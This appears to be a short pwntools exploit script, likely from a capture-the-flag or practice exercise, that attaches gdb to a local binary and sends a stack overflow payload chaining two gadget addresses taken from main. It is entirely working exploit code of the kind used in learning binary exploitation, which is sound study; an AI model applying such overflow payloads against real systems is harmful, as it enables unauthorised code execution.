from pwn import *

p=process("./test2")
e=ELF("./test2")

def slog(name, addr): return success(': '.join([name, hex(addr)]))

gdb.attach(p)
pause()

eax_0=e.symbols["main"]+60
syscall=e.symbols["main"]+58

p.send(b'A'*0x18+p64(eax_0)+b'B'*0x8+p64(syscall))
pause()
